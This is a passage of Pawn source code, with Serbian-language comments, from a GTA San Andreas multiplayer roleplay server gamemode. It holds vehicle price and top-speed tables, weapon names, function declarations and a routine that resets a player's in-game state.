    { 463, 215000 }, // Freeway
    { 464, 0 }, // RC Baron edit
    { 465, 0 }, // RC Raider edit
    { 466, 175000 }, // Glendale
    { 467, 180000 }, // Oceanic
    { 468, 230000 }, // Sanchez
    { 469, 3300000 }, // Sparrow edit
    { 470, 1500000 }, // Patriot
    { 471, 280000 }, // Quad
    { 472, 0 }, // Coastguard edit
    { 473, 240000 }, // Dinghy edit
    { 474, 390000 }, // Hermes
    { 475, 840000 }, // Sabre
    { 476, 6000000 }, // Rustler edit
    { 477, 890000 }, // ZR-350
    { 478, 0 }, // Walton
    { 479, 140000 }, // Regina
    { 480, 270000 }, // Comet
    { 481, 25000 }, // BMX edit
    { 482, 13000 }, // Burrito
    { 483, 115000 }, // Camper
    { 484, 2500000 }, // Marquis edit
    { 485, 0 }, // Baggage edit
    { 486, 0 }, // Dozer
    { 487, 10000000 }, // Maverick edit
    { 488, 0 }, // SAN News Maverick edit
    { 489, 1700000 }, // Rancher
    { 490, 0 }, // FBI Rancher edit
    { 491, 335000 }, // Virgo
    { 492, 750000 }, // Greenwood
    { 493, 950000 }, // Jetmax edit
    { 494, 6200000 }, // Hotring Racer edit
    { 495, 2500000 }, // Sandking edit
    { 496, 200000 }, // Blista Compact
    { 497, 0 }, // Police Maverick edit
    { 498, 0 }, // Boxville
    { 499, 0 }, // Benson
    { 500, 160000 }, // Mesa
    { 501, 4000000 }, // RC Goblin edit
    { 502, 1000000 }, // Hotring Racer edit
    { 503, 1000000 }, // Hotring Racer edit
    { 504, 0 }, // Bloodring Banger edit
    { 505, 0 }, // Rancher
    { 506, 1900000 }, // Super GT
    { 507, 160000 }, // Elegant
    { 508, 0 }, // Journey
    { 509, 25000 }, // Bike edit
    { 510, 32000 }, // Mountain Bike edit
    { 511, 0 }, // Beagle edit
    { 512, 900000 }, // Cropduster edit
    { 513, 9000000 }, // Stuntplane edit
    { 514, 0 }, // Tanker
    { 515, 0 }, // Roadtrain
    { 516, 190000 }, // Nebula
    { 517, 200000 }, // Majestic
    { 518, 230000 }, // Buccaneer
    { 519, 2700000 }, // Shamal edit
    { 520, 0 }, // Hydra edit
    { 521, 1000000 }, // FCR-900
    { 522, 4500000 }, // NRG-500
    { 523, 0 }, // HPV1000 edit
    { 524, 0 }, // Cement Truck
    { 525, 0 }, // Towtruck
    { 526, 170000 }, // Fortune
    { 527, 160000 }, // Cadrona edit
    { 528, 0 }, // FBI Truck edit
    { 529, 200000 }, // Willard
    { 530, 0 }, // Forklift edit
    { 531, 50000 }, // Tractor
    { 532, 0 }, // Combine Harvester
    { 533, 980000 }, // Feltzer
    { 534, 3800000 }, // Remington
    { 535, 850000 }, // Slamvan
    { 536, 550000 }, // Blade
    { 537, 0 }, // Freight edit
    { 538, 0 }, // Brownstreak edit
    { 539, 0 }, // Vortex edit
    { 540, 190000 }, // Vincent edit
    { 541, 5000000 }, // Bullet
    { 542, 230000 }, // Clover
    { 543, 125000 }, // Sadler
    { 544, 0 }, // Firetruck LA edit
    { 545, 1000000 }, // Hustler
    { 546, 95000 }, // Intruder
    { 547, 95000 }, // Primo
    { 548, 0 }, // Cargobob edit
    { 549, 212000 }, // Tampa
    { 550, 450000 }, // Sunrise
    { 551, 110000 }, // Merit
    { 552, 0 }, // Utility Van edit
    { 553, 0 }, // Nevada edit
    { 554, 132099 }, // Yosemite
    { 555, 250000 }, // Windsor
    { 556, 0 }, // Monster "A" edit
    { 557, 0 }, // Monster "B" edit
    { 558, 240000 }, // Uranus
    { 559, 2900000 }, // Jester
    { 560, 4500000 }, // Sultan
    { 561, 1000000 }, // Stratum
    { 562, 3100000 }, // Elegy
    { 563, 0 }, // Raindance edit
    { 564, 0 }, // RC Tiger edit
    { 565, 750000 }, // Flash
    { 566, 175000 }, // Tahoma
    { 567, 650000 }, // Savanna
    { 568, 600000 }, // Bandito
    { 569, 0 }, // Freight Flat Trailer edit
    { 570, 0 }, // Streak Trailer edit
    { 571, 0 }, // Kart
    { 572, 0 }, // Mower
    { 573, 2500000 }, // Dune
    { 574, 0 }, // Sweeper
    { 575, 260000 }, // Broadway
    { 576, 240000 }, // Tornado
    { 577, 0 }, // AT400 edit
    { 578, 1000000 }, // DFT-30
    { 579, 3500000 }, // Huntley
    { 580, 250000 }, // Stafford
    { 581, 800000 }, // BF-400
    { 582, 0 }, // Newsvan edit
    { 583, 0 }, // Tug edit
    { 584, 0 }, // Petrol Trailer edit
    { 585, 1350000 }, // Emperor
    { 586, 250000 }, // Wayfarer
    { 587, 220000 }, // Euros
    { 588, 0 }, // Hotdog edit
    { 589, 900000 }, // Club
    { 590, 0 }, // Freight Box Trailer edit
    { 591, 0 }, // Article Trailer 3 edit
    { 592, 0 }, // Andromada edit
    { 593, 7300000 }, // Dodo edit
    { 594, 0 }, // RC Cam edit
    { 595, 0 }, // Launch edit
    { 596, 140000 }, // Police Car (LSPD) edit
    { 597, 145000 }, // Police Car (SFPD) edit
    { 598, 150000 }, // Police Car (LVPD) edit
    { 599, 160000 }, // Police Ranger edit
    { 600, 200000 }, // Picador
    { 601, 180000 }, // S.W.A.T. edit
    { 602, 225000 }, // Alpha
    { 603, 235000 }, // Phoenix
    { 604, 0 }, // Glendale Shit edit
    { 605, 0 }, // Sadler Shit edit
    { 606, 0 }, // Baggage Trailer "A" edit
    { 607, 0 }, // Baggage Trailer "B" edit
    { 608, 0 }, // Tug Stairs Trailer edit
    { 609, 0 }, // Boxville
    { 610, 0 }, // Farm Trailer edit
    { 611, 0 } // Utility Trailer edit
};

new VehicleSpeedAC[ 212 ][ 2 ] = {
	{ 400, 162 },
	{ 401, 151 },
	{ 402, 191 },
	{ 403, 114 },
	{ 404, 137 },
	{ 405, 168 },
	{ 406, 115 },
	{ 407, 153 },
	{ 408, 105 },
	{ 409, 150 },
	{ 410, 134 },
	{ 411, 225 },
	{ 412, 173 },
	{ 413, 115 },
	{ 414, 110 },
	{ 415, 196 },
	{ 416, 158 },
	{ 417, 135 }, //avion
	{ 418, 120 },
	{ 419, 163 },
	{ 420, 149 },
	{ 421, 158 },
	{ 422, 144 },
	{ 423, 103 },
	{ 424, 139 },
	{ 425, 215 }, //avion
	{ 426, 178 },
	{ 427, 160 },
	{ 428, 162 },
	{ 429, 206 },
	{ 430, 0 }, // brod
	{ 431, 135 },
	{ 432, 99 },
	{ 433, 115 },
	{ 434, 171 },
	{ 435, 0 }, //prikolica
	{ 436, 153 },
	{ 437, 162 },
	{ 438, 147 },
	{ 439, 173 },
	{ 440, 140 },
	{ 441, 0 }, //mali autic
	{ 442, 144 },
	{ 443, 131 },
	{ 444, 115 },
	{ 445, 168 },
	{ 446, 0 }, // brod
	{ 447, 155 },
	{ 448, 189 },
	{ 449, 0 }, // tramvaj
	{ 450, 0 }, // prikolica
	{ 451, 197 },
	{ 452, 0 }, //BROD
	{ 453, 0 }, //BROD
	{ 454, 0 }, //BROD
	{ 455, 162 },
	{ 456, 110 },
	{ 457, 100 },
	{ 458, 161 },
	{ 459, 140 },
	{ 460, 155 },
	{ 461, 195 },
	{ 462, 184 },
	{ 463, 206 },
	{ 464, 0 }, //mali avion igracka
	{ 465, 0 }, //mali tenk igracka
	{ 466, 152 },
	{ 467, 145 },
	{ 468, 185 },
	{ 469, 120 }, //
	{ 470, 161 },
	{ 471, 115 },
	{ 472, 0 }, //BROD
	{ 473, 0 }, //BROD
	{ 474, 153 },
	{ 475, 177 },
	{ 476, 275 }, //(ZNAM DA JE NEREALNO AL I NEREALAN JE AVION)
	{ 477, 191 },
	{ 478, 122 },
	{ 479, 144 },
	{ 480, 188 },
	{ 481, 0 }, //BMX
	{ 482, 161 }, //
	{ 483, 128 },
	{ 484, 0 }, //BROD
	{ 485, 105 },
	{ 486, 70 },
	{ 487, 190 },
	{ 488, 160 },
	{ 489, 144 },
	{ 490, 163 },
	{ 491, 153 },
	{ 492, 145 },
	{ 493, 0 }, //
	{ 494, 219 },
	{ 495, 181 },
	{ 496, 167 },
	{ 497, 190 },
	{ 498, 113 },
	{ 499, 128 },
	{ 500, 145 },
	{ 501, 35 },
	{ 502, 219 },
	{ 503, 219 },
	{ 504, 177 },
	{ 505, 144 },
	{ 506, 183 },
	{ 507, 170 },
	{ 508, 112 },
	{ 509, 0 }, //Biciklo
	{ 510, 0 }, //Biciklo
	{ 511, 187 },
	{ 512, 197 },
	{ 513, 0 }, //
	{ 514, 125 },
	{ 515, 147 },
	{ 516, 161 },
	{ 517, 162 },
	{ 518, 169 },
	{ 519, 268 },
	{ 520, 268 },
	{ 521, 210 },
	{ 522, 215 },
	{ 523, 200 },
	{ 524, 135 },
	{ 525, 165 },
	{ 526, 162 },
	{ 527, 153 },
	{ 528, 180 },
	{ 529, 153 },
	{ 530, 66 },
	{ 531, 75 },
	{ 532, 115 },
	{ 533, 171 },
	{ 534, 173 },
	{ 535, 163 },
	{ 536, 177 },
	{ 537, 0 }, // voz
	{ 538, 0 }, // Voz -
	{ 539, 105 },
	{ 540, 153 },
	{ 541, 207 },
	{ 542, 169 },
	{ 543, 155 },
	{ 544, 153 },
	{ 545, 151 },
	{ 546, 153 },
	{ 547, 147 },
	{ 548, 0 }, //Helikopter - Nece da poleti.
	{ 549, 158 },
	{ 550, 149 },
	{ 551, 162 },
	{ 552, 125 },
	{ 553, 0 }, // avion golem
	{ 554, 148 },
	{ 555, 165 },
	{ 556, 115 },
	{ 557, 115 },
	{ 558, 160 },
	{ 559, 182 },
	{ 560, 174 },
	{ 561, 159 },
	{ 562, 182 },
	{ 563, 145 },
	{ 564, 0 }, //-mali tenk igracka
	{ 565, 169 },
	{ 566, 164 },
	{ 567, 178 },
	{ 568, 151 },
	{ 569, 0 }, //VOZ
	{ 570, 0 }, //VOZ
	{ 571, 98 },
	{ 572, 65 },
	{ 573, 115 },
	{ 574, 110 },
	{ 575, 162 },
	{ 576, 162 },
	{ 577, 0 }, //NEPOTREBAN AVION
	{ 578, 135 },
	{ 579, 163 },
	{ 580, 158 },
	{ 581, 201 },
	{ 582, 140 },
	{ 583, 90 },
	{ 584, 0 }, //Prikolica
	{ 585, 157 },
	{ 586, 209 },
	{ 587, 169 },
	{ 588, 112 },
	{ 589, 168 },
	{ 590, 0 }, //Vagon
	{ 591, 0 }, //Prikolica
	{ 592, 268 },
	{ 593, 268 },
	{ 594, 0 }, //Saksija
	{ 595, 0 }, //Brod -
	{ 596, 180 },
	{ 597, 180 },
	{ 598, 180 },
	{ 599, 162 },
	{ 600, 155 },
	{ 601, 115 },
	{ 602, 173 },
	{ 603, 175 },
	{ 604, 151 },
	{ 605, 155 },
	{ 606, 0 }, //Prikolica
	{ 607, 0 }, //Prikolica
	{ 608, 0 }, //Prikolica
	{ 609, 112 },
	{ 610, 0 }, //Prikolica
	{ 611, 0 } //Prikolica
};

//------------------------------------------------------------------------------
new WeapNames[ 48 ][ 32 ] = {
	"Unarmed",
	"Brass Knuckles",
	"Golf Club",
	"Night Stick",
	"Knife",
	"Baseball Bat",
	"Shovel",
	"Pool Cue",
	"Katana",
	"Chainsaw",
	"Purple Dildo",
	"Big White Vibrator",
	"Medium White Vibrator",
	"Small White Vibrator",
	"Flowers",
	"Cane",
	"Grenade",
	"Tear Gas",
	"Molotov",
	"Invalid Weapon",
	"Invalid Weapon",
	"Invalid Weapon",
	"Colt 45",
	"Silenced Colt 45",
	"Desert Eagle",
	"Shotgun",
	"Sawno-ff Shotgun",
	"Combat Shotgun",
	"Micro SMG",
	"SMG",
	"AK47",
	"M4",
	"Tec9",
	"Country Rifle",
	"Sniper Rifle",
	"Rocket Launcher",
	"HS Rocket Launcher",
	"Flamethrower",
	"Minigun",
	"Satchel Charge",
	"Detonator",
	"Spray Can",
	"Fire Extinguisher",
	"Camera",
	"Night Vision Goggles",
	"Infrared Vision Goggles",
	"Parachute",
	"Fake Pistol"
};
//===========================[ FORWARDOVI ]=====================================

forward split(const strsrc[], strdest[][], delimiter);
forward ImmobCountForPlayer( playerid );
forward BreakLockCountForPlayer( playerid );
forward Register( playerid );
forward LoadATM( id, name[], value[] );
forward ZaustaviWAR( w );
forward TimerWAROstaloVremeB( w );
forward VehicleBreakLock( playerid, vehicleid, autoid );
forward TrashLimitOff( playerid );
forward UpdatePlayerGps( playerid, fresh );
forward GetPlayerBusinessId( playerid, type );
forward LoadEvent( id, name[], value[] );
forward EventTimeR( );
forward UlazIzlaz( playerid);
forward SacuvajATM( id );
forward StopCameraEffect( playerid );
forward Speeding( playerid );
forward NewsOn( );
forward AddsOn( );
forward SaveBussines( id );
forward SaveProperty( id );
forward SacuvajObjekte( id );
forward OcitajImovinu( id, name[], value[] );
forward OcitajObjekte( id, name[], value[] );
forward SacuvajKont( id );
forward OcitajKont( id, name[], value[] );
forward OcitajFirmu( idx, name[], value[] );
forward SaveVehicle( id );
forward SaveAntiCheat( );
forward LoadAntiCheat( name[ ], value[ ] );
forward OcitajVozilo( id, name[], value[] );
forward PorukaRadius( Float:radi, playerid, string[ ], col1 );
forward SlobodnoSada( playerid );
forward PostaviSpawn( playerid );
forward OcitajKorisnika( playerid, name[ ], value[ ] );
forward OcitajAdmina( playerid, name[ ], value[ ] );
forward SaveOrganization( id );
forward UcitajOrganizaciju( id, name[], value[] );
forward VehicleEngineStart( playerid );
forward KneeTrain( playerid );
forward BoxTrain( playerid );
forward KungTrain( playerid );
forward GrabTrain( playerid );
forward GPSConnect( playerid, gpslvl, vehicleid );
forward KickIgraca( playerid );
forward AntiSpawnCrash();
forward ResprayTimer( playerid, autoid );
forward CarDamageTimer( playerid );
forward CheckGas( playerid );
forward Fillup( playerid, fuel );
forward Postaviotable( playerid, izbor );
forward Istovar( playerid, vehicleid, broj );
forward Utovar( playerid, vehicleid, broj );
forward PayDay( playerid );
forward PayCheck( playerid );
forward StopMusic( );
forward TravaT( i );
forward SrednjaCasovi( playerid, broj );
forward FakultetCasovi( playerid, broj );
forward OsnovnaCasovi( playerid, broj );
forward CistacKilometri( playerid );
forward CarCheck( playerid );
forward DinamicWeather( );
forward Provala( playerid );
forward TazovanTajmer( playerid );
forward BackupClear( playerid, calledbytimer );
forward KSpam( playerid );
forward PocetniTut( playerid, izbor );
forward Taxitimer( playerid );
forward SacuvajAdmina( playerid );
forward Ame( playerid );
forward ClearKnock( playerid );
forward ClearPlayerRob( playerid );
forward CityTut( playerid, learnid );
forward Provera1( playerid, type );
forward Provera2( playerid, type );

//------------------------------------------------------------------------------
ResetPlayer( playerid ) {
    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) {
		DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
	}

    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) {
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	}

	if( IsValidDynamicCP(PlayerGpsRadar[ playerid ][_pgrCheckPointId ] ) ) {
		DestroyDynamicCP(PlayerGpsRadar[ playerid ][_pgrCheckPointId] );
	}

    PlayerGpsRadar[ playerid ][_pgrIconId] = -1;
    PlayerGpsRadar[ playerid ][_pgrObject] = -1;
    PlayerGpsRadar[ playerid ][_pgrCheckPointId] = -1;
    ResetujAdmina( playerid );
    //
    ResetTuningInfo( playerid );
    //
    flymodecamera[ playerid ][cameramode] 	= false;
	flymodecamera[ playerid ][lrold]	   	 	= 0;
	flymodecamera[ playerid ][udold]   		= 0;
	flymodecamera[ playerid ][mode]   		= 0;
	flymodecamera[ playerid ][lastmove]   	= 0;
	flymodecamera[ playerid ][accelmul]   	= 0.0;
    //
	for(  new i = 0; i < 10; i++ ) {
	  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
	  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
	  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
	  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
		KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
	}
	KladionicaListic[ playerid ][ Uplaceno ] = false;
	KladionicaListic[ playerid ][ Zavrseno ] = false;
	KladionicaListic[ playerid ][ Uplata ] = 0;
 	KladionicaListic[ playerid ][ Dobitak ] = 0;
 	KladionicaListic[ playerid ][ Status ] = false;
	IzabraniPar[ playerid ] = -1;
    //
    Novi_KillTimer( TimerLearn[ playerid ] );
	Novi_KillTimer( gZone_Timer[ playerid ] );
    Novi_KillTimer( PusenjeTimer[ playerid ] );
    Novi_KillTimer( BusVozac[ playerid ] );
    Novi_KillTimer( atmrobTimer[ playerid ] );
	Novi_KillTimer( SkolaTimer[ playerid ] );
	Novi_KillTimer( TimerPitanje[ playerid ] );
	Novi_KillTimer( RentTimer[ playerid ] );
	Novi_KillTimer( DragTimer[ playerid ] );
	Novi_KillTimer( TimerTutorial[ playerid ] );
	Novi_KillTimer( FarbanjeTimer[ playerid ] );
	Novi_KillTimer( BolnicaTimer[ playerid ] );
	Novi_KillTimer( TaxiTimer[ playerid ] );
	Novi_KillTimer( TazerTimer[ playerid ] );
	Novi_KillTimer( CistacTimer[ playerid ] );
	Novi_KillTimer( TrashTimer[ playerid ] );
	Novi_KillTimer( PilotTimer[ playerid ] );
	Novi_KillTimer( FarbanjeTimer[ playerid ] );
	Novi_KillTimer( TravaTimer[ playerid ] );
	Novi_KillTimer( IzazivanjeTimer[ playerid ] );
	Novi_KillTimer( PljackanjeBankeTimer[ playerid ] );
	Novi_KillTimer( PljackanjeZlatareTimer[ playerid ] );
	Novi_KillTimer( rudarPosao[ playerid ][ rudarTimer ] );
	//----------------[ Enum ]----------------
	PlayerInfo[ playerid ][ xPol ] = 1;
	PlayerInfo[ playerid ][ xGodine ] = 0;
    PlayerInfo[ playerid ][ xNovac ] = 0;
	PlayerInfo[ playerid ][ xLevel ] = 0;
	PlayerInfo[ playerid ][ xRespekt ] = 0;
	PlayerInfo[ playerid ][ xPoboljsanja ] = 0;
	PlayerInfo[ playerid ][ xPayDay ] = 0;
	PlayerInfo[ playerid ][ xAdmin ] = 0;
    PlayerInfo[ playerid ][ xTurpija ] = 0;
    PlayerInfo[ playerid ][ xMichaelMisijaSpawn ] = 0;
    PlayerInfo[ playerid ][ xPosadioDrogu ] = 0;
    PlayerInfo[ playerid ][ xPosadioDrogu2 ] = 0;
	PlayerInfo[ playerid ][ xSkin ] = 26;
	PlayerInfo[ playerid ][ xSpawn ] = 0;
	PlayerInfo[ playerid ][ xLider ] = 0;
	PlayerInfo[ playerid ][ xClan ] = 0;
	PlayerInfo[ playerid ][ xKazneniUgovor ] = 0;
	PlayerInfo[ playerid ][ xRank ] = 0;
	PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = -1;
	PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1;
	PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1;
	PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1;
	PlayerInfo[ playerid ][ xMaterijali ] = 0;
	PlayerInfo[ playerid ][ xFirmaID ] = -1;
	PlayerInfo[ playerid ][ xPosao ] = 0;
	PlayerInfo[ playerid ][ xUgovor ] = 0;
	PlayerInfo[ playerid ][ xMehSkill ] = 0;
	PlayerInfo[ playerid ][ xMDelovi ] = 0;
	PlayerInfo[ playerid ][ xHead ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xStaffMin ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 5 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 6 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 7 ] = 0;
	PlayerInfo[ playerid ][ xHeadPos ][ 8 ] = 0;
	PlayerInfo[ playerid ][ xFace ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 5 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 6 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 7 ] = 0;
	PlayerInfo[ playerid ][ xFacePos ][ 8 ] = 0;
	PlayerInfo[ playerid ][ xSungMask ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] = 0;
	PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] = 0;
	PlayerInfo[ playerid ][ xCigare ] = 0;
	PlayerInfo[ playerid ][ xUpaljac ] = 0;
	PlayerInfo[ playerid ][ xBStil ] = 0;
	PlayerInfo[ playerid ][ xRegistrovan ] = 0;
	PlayerInfo[ playerid ][ xSHealth ] = 0;
	PlayerInfo[ playerid ][ xBrojTelefona ] = 0;
	PlayerInfo[ playerid ][ xVozacka ] = 0;
	PlayerInfo[ playerid ][ xMotorska ] = 0;
	PlayerInfo[ playerid ][ xKamionskaC1 ] = 0;
	PlayerInfo[ playerid ][ xKamionskaC2 ] = 0;
	PlayerInfo[ playerid ][ xKamionskaC3 ] = 0;
	PlayerInfo[ playerid ][ xBrodska ] = 0;
	PlayerInfo[ playerid ][ xLetelica ] = 0;
	PlayerInfo[ playerid ][ xOsnovna ] = 0;
    PlayerInfo[ playerid ][ xSrednja ] = 0;
    PlayerInfo[ playerid ][ xFakultet ] = 0;
	PlayerInfo[ playerid ][ xSkolaLimit ] = 0;
	PlayerInfo[ playerid ][ xUbijen ] = 0;
	PlayerInfo[ playerid ][ xDrug ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xDrug ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xDrug ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xDrug ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xDrug ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xDrugCode ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xDrugCode ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xDrugCode ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xDrugCode ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xDrugCode ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xSolna ] = 0;
	PlayerInfo[ playerid ][ xPseudo ] = 0;
	PlayerInfo[ playerid ][ xSodaB ] = 0;
	PlayerInfo[ playerid ][ xCrveniF ] = 0;
	PlayerInfo[ playerid ][ xLysAcid ] = 0;
	PlayerInfo[ playerid ][ xDesVoda ] = 0;
	PlayerInfo[ playerid ][ xMarihuana ] = 0;
	PlayerInfo[ playerid ][ xOpium ] = 0;
	PlayerInfo[ playerid ][ xKalcij ] = 0;
	PlayerInfo[ playerid ][ xAmonijH ] = 0;
	PlayerInfo[ playerid ][ xKokain ] = 0;
	PlayerInfo[ playerid ][ xKokain2 ] = 0;
	PlayerInfo[ playerid ][ xMetilAmin ] = 0;
	PlayerInfo[ playerid ][ xHunger ] = 75;
	PlayerInfo[ playerid ][ xHeroinAddict ] = false;
	PlayerInfo[ playerid ][ xHeroinUsed ] = 0;
	PlayerInfo[ playerid ][ xHeroinIndicator ] = 0;
	PlayerInfo[ playerid ][ xCokeCrackAddict ] = false;
	PlayerInfo[ playerid ][ xCokeCrackUsed ] = 0;
	PlayerInfo[ playerid ][ xCokeCrackIndicator ] = 0;
	PlayerInfo[ playerid ][ xMethAddict ] = false;
	PlayerInfo[ playerid ][ xMethIndicator ] = 0;
    PlayerInfo[ playerid ][ xMethUsed ] = 0;
    PlayerInfo[ playerid ][ xInekcija ] = false;
    PlayerInfo[ playerid ][ xToolkit ] = false;
    PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1;
    PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1;
    PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 0 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 1 ] = -1;
	PlayerInfo[ playerid ][ xObject ][ 2 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 3 ] = -1;
	PlayerInfo[ playerid ][ xObject ][ 4 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 5 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 6 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 7 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 8 ] = -1;
    PlayerInfo[ playerid ][ xObject ][ 9 ] = -1;
    PlayerInfo[ playerid ][ xGunLicense ] = false;
    PlayerInfo[ playerid ][ xTelefonBon ] = 0;
    PlayerInfo[ playerid ][ xModelTelefona ] = 0;
    PlayerInfo[ playerid ][ xSnaga ] = 0;
    PlayerInfo[ playerid ][ xZatvor ] = 0;
    PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
    PlayerInfo[ playerid ][ xWanted ] = 0;
    PlayerInfo[ playerid ][ xUhapsen ] = 0;
    PlayerInfo[ playerid ][ xPDUhapsio ] = 0;
    PlayerInfo[ playerid ][ xPDStatsTicket ] = 0;
	PlayerInfo[ playerid ][ xPDStatsTicketMoney ] = 0;
	PlayerInfo[ playerid ][ xTakenWeps ] = 0;
    PlayerInfo[ playerid ][ xTakenDrugs ] = 0;
    PlayerInfo[ playerid ][ xPocetniTut ] = 0;
    PlayerInfo[ playerid ][ xAKod ] = 0;
    PlayerInfo[ playerid ][ xSat ] = 0;
    PlayerInfo[ playerid ][ xMaskID ] = 0;
	PlayerInfo[ playerid ][ xBRacun ] = 0;
	PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] = 0;
    PlayerInfo[ playerid ][ xIznosRate ] = 0;
    PlayerInfo[ playerid ][ xIznosKredita ] = 0;
    PlayerInfo[ playerid ][ xOnlineSati ] = 0;
    PlayerInfo[ playerid ][ xSupporter ] = 0;
    PlayerInfo[ playerid ][ xRPLearn ] = 0;
    PlayerInfo[ playerid ][ xWarn ] = 0;
    PlayerInfo[ playerid ][ xMute ] = 0;
    PlayerInfo[ playerid ][ xMarker ][ 0 ] = 0.00000;
    PlayerInfo[ playerid ][ xMarker ][ 1 ] = 0.00000;
    PlayerInfo[ playerid ][ xMarker ][ 2 ] = 0.00000;
    PlayerInfo[ playerid ][ xBrojNews ] = 0;
    PlayerInfo[ playerid ][ xOrgUgovor ] = 0;
	PlayerInfo[ playerid ][ xHelmet ] = 0;
	PlayerInfo[ playerid ][ xBDays ] = 0;
	PlayerInfo[ playerid ][ xBMonths ] = 0;
	PlayerInfo[ playerid ][ xBYears ] = 0;
	PlayerInfo[ playerid ][ xGradRank ] = 0;
	PlayerInfo[ playerid ][ xSpawned ] = 0;
	PlayerInfo[ playerid ][ xSpecAdmin ] = 0;
	PlayerInfo[ playerid ][ xSkriptaRank ] = 0;
	PlayerInfo[ playerid ][ xUlazBL ] = 0;
	PlayerInfo[ playerid ][ xBoombox ] = false;
	PlayerInfo[ playerid ][ xHelmetPos ][ 0 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 1 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 2 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 3 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 4 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 5 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 6 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 7 ] = 0;
	PlayerInfo[ playerid ][ xHelmetPos ][ 8 ] = 0;
	PlayerInfo[ playerid ][ xDrzava ] = 0;
	PlayerInfo[ playerid ][ xVIPLevel ] = 0;
    PlayerInfo[ playerid ][ xVIPVreme ] = 0;
	PlayerInfo[ playerid ][ xHitmenCena ] = 0;
	PlayerInfo[ playerid ][ xLesLimit ] = 0;
	PlayerInfo[ playerid ][ xMarried ] = false;
	PlayerInfo[ playerid ][ xTogMob ] = false;
	PlayerInfo[ playerid ][ xHotelID ] = -1;
	PlayerInfo[ playerid ][ xHotelRoom ] = -1;
	PlayerInfo[ playerid ][ xPromoter ] = 0;
	PlayerInfo[ playerid ][ xFieldID ] = -1;
	PlayerInfo[ playerid ][ xSljive ] = 0;
	PlayerInfo[ playerid ][ xKruske ] = 0;
	PlayerInfo[ playerid ][ xJabuke ] = 0;
	PlayerInfo[ playerid ][ xKupus ] = 0;
	PlayerInfo[ playerid ][ xRuze ] = 0;
	PlayerInfo[ playerid ][ xSemeSljive ] = 0;
	PlayerInfo[ playerid ][ xSemeKruske ] = 0;
	PlayerInfo[ playerid ][ xSemeJabuke ] = 0;
	PlayerInfo[ playerid ][ xSemeKupusa ] = 0;
	PlayerInfo[ playerid ][ xSemeRuze ] = 0;
	PlayerInfo[ playerid ][ xLottoNumber ] = 0;
	PlayerInfo[ playerid ][ xLottoMoney ] = 0;
	PlayerInfo[ playerid ][ xGarageID ] = -1;
